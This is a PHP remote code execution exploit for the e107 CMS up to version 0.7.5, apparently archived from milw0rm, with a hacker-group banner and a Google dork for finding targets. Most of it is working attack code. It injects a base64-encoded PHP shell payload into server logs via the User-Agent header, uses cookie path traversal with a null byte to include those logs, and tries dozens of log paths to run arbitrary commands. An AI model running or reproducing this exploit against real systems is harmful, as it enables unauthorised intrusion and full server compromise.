<?

print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 

[Exploit name: e107 <= 0.7.5 Remote Code Execution Exploit
[Script name: e107 v.0.7.5
[Script site: http://e107.org/
dork: "This site is powered by e107"



Find by: Kacper (a.k.a Rahim)


========>  DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam  <========
========>         http://www.rahim.webd.pl/            <========

Contact: kacper1964@yahoo.pl

(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon 
TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein
Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios, 
mIvus, nukedclx, SkD, wacky, xoron
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                Greetings for 4ll Fusi0n Group members ;-)
                and all members of hacker.com.pl ;)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
';


/*
works with register_globals=On

explaination:
i find in file gsitemap.php on line 19-28:

....
require_once("class2.php");                             // <--------{1}

if (file_exists(e_PLUGIN."gsitemap/languages/gsitemap_".e_LANGUAGE.".php"))
{
	include_once(e_PLUGIN."gsitemap/languages/gsitemap_".e_LANGUAGE.".php");
}
else
{
	include_once(e_PLUGIN."gsitemap/languages/gsitemap_English.php");
}

....

in file class2.php on line 328-334:
....
$language=(isset($_COOKIE['e107language_'.$pref['cookie_name']]) ? $_COOKIE['e107language_'.$pref['cookie_name']] : ($pref['sitelanguage'] ? $pref['sitelanguage'] : "English"));         // <---------{2}
define("e_LAN", $language);                            // <---------{3}
define("USERLAN", ($user_language && (strpos(e_SELF, $PLUGINS_DIRECTORY) !== FALSE || (strpos(e_SELF, $ADMIN_DIRECTORY) === FALSE && file_exists(e_LANGUAGEDIR.$user_language."/lan_".e_PAGE)) || (strpos(e_SELF, $ADMIN_DIRECTORY) !== FALSE && file_exists(e_LANGUAGEDIR.$user_language."/admin/lan_".e_PAGE)) || file_exists(dirname($_SERVER['SCRIPT_FILENAME'])."/languages/".$user_language."/lan_".e_PAGE)    || (    (strpos(e_SELF, $ADMIN_DIRECTORY) == FALSE) && (strpos(e_SELF, $PLUGINS_DIRECTORY) == FALSE) && file_exists(e_LANGUAGEDIR.$user_language."/".$user_language.".php")  )   ) ? $user_language : FALSE));
define("e_LANGUAGE", (!USERLAN || !defined("USERLAN") ? $language : USERLAN));                    // <---------{4}

e107_include(e_LANGUAGEDIR.e_LANGUAGE."/".e_LANGUAGE.".php");                    // <---------{5}
e107_include_once(e_LANGUAGEDIR.e_LANGUAGE."/".e_LANGUAGE."_custom.php");
....

so we can use: Cookie: e107language_e107cookie=../../../../../../../../../etc/passwd%00
local include :)


by Kacper ;)
*/


if ($argc<9) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path username password user_id user_session date cmd OPTIONS
host:      target server (ip/hostname)
path:      e107 path
username:  you registered login
password:  you username password
user_id:   you user ID
user_session: user sid
date:      current date, like: 307.2006 //$date = date("z.Y", time());
cmd:       a shell command (ls -la)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 2.2.2.2 /e107/ Hauru enter 99 c16d9ef241904bf801c6e45693387506 307.2006 ls -la -P1.1.1.1:80
php '.$argv[0].' 1.1.1.1 / Hauru enter 99 c16d9ef241904bf801c6e45693387506 307.2006 ls -la
-----------------------------------------------------------------------------
');

die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$username=$argv[3];
$password=$argv[4];
$id=$argv[5];
$session=$argv[6];
$date=$argv[7];
$cmd="";

$port=80;
$proxy="";
for ($i=8; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}


echo "[1] insert evil code in logfiles ...\r\n\r\n";
$hauru = base64_decode("Jzw/cGhwIG9iX2NsZWFuKCk7Ly9SdWNob215IHphbWVrIEhhdXJ1IDstKWVjaG8iLi4uSGFja2VyLi5LYWNwZXIuLk1hZGUuLmluLi5Qb2xhbmQhIS4uLkRFVklMLlRFQU0uLnRoZS4uYmVzdC4ucG9saXNoLi50ZWFtLi5HcmVldHouLi4iO2VjaG8iLi4uR28gVG8gREVWSUwgVEVBTSBJUkM6IDcyLjIwLjE4LjY6NjY2NyAjZGV2aWx0ZWFtIjtlY2hvIi4uLkRFVklMIFRFQU0gU0lURTogaHR0cDovL3d3dy5yYWhpbS53ZWJkLnBsLyI7aW5pX3NldCgibWF4X2V4ZWN1dGlvbl90aW1lIiwwKTtlY2hvICJIYXVydSI7cGFzc3RocnUoJF9TRVJWRVJbSFRUUF9IQVVSVV0pO2RpZTs/Pg==");
$packet="GET ".$p.$hauru." HTTP/1.0\r\n";
$packet.="User-Agent: ".$hauru." Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacket($packet);
sleep(3);

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="username"

'.$username.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="userpass"

'.$password.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="userlogin"

Log In
-----------------------------7d6224c08dc--
';

echo "login hauru in e107...\n";
$packet ="POST ".$p."login.php HTTP/1.0\r\n";
$packet.="User-Agent: ".$hauru."\r\n";
$packet.="CLIENT-IP: 999.999.999.999\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);

echo "insert hauru in e107...\n";
$packet ="POST ".$p."index.php?logout HTTP/1.0\r\n";
$packet.="Cookie: e107cookie=".$id.".".$session.";\r\n";
$packet.="User-Agent: ".$hauru."\r\n";
$packet.="CLIENT-IP: 999.999.999.999\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);


echo " now remote code execution...\n";
$packet ="GET ".$p."gsitemap.php HTTP/1.1\r\n";
$packet.="Cookie: e107language_e107cookie=../e107_plugins/log/logs/logi_".$date.".php%00;\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}

$paths= array (
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../../../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

for ($i=0; $i<=count($paths)-1; $i++)
{
$a=$i+2;
echo "[2] [".$a."] Check Path: ".$paths[$i]."\r\n";
echo "[3] remote code execution...wait..\n";
$packet ="GET ".$p."gsitemap.php HTTP/1.1\r\n";
$packet.="Cookie: e107language_e107cookie=../".$paths[$i]."%00;\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}
}
echo "Exploit err0r :(\r\n";
echo "Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n";
?>

# milw0rm.com [2006-11-04]
